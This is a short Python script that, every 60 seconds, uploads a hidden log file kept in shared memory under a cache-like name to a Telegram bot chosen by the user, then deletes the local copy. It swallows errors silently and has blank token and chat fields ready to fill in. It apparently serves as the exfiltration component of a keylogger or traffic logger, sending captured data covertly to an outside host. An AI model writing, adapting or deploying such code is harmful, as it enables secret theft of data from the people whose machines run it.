import requests
import time
import threading
import os

BOT_TOKEN = "" #ENTER BOT TOKEN HERE
CHAT_ID = "" #ENTER CHAT/CHANNEL ID HERE
MESSAGE_FILE = "/dev/shm/.cache-netlog"
MAX_RETRIES = 5
INTERVAL = 60 #TIME INTERVAL AFTER WHICH FILE WILL BE SENT IN SECONDS

def send_logs():
    for attempt in range(MAX_RETRIES):
        try:
            if os.path.exists(MESSAGE_FILE):
                with open(MESSAGE_FILE, 'rb') as f:
                    response = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                        data={"chat_id": CHAT_ID},
                        files={"document": f}
                    )
                if response.status_code == 200:
                    os.remove(MESSAGE_FILE)
                    break
        except requests.ConnectionError:
            time.sleep(2)
        except Exception:
            pass

    threading.Timer(INTERVAL, send_logs).start()

send_logs()
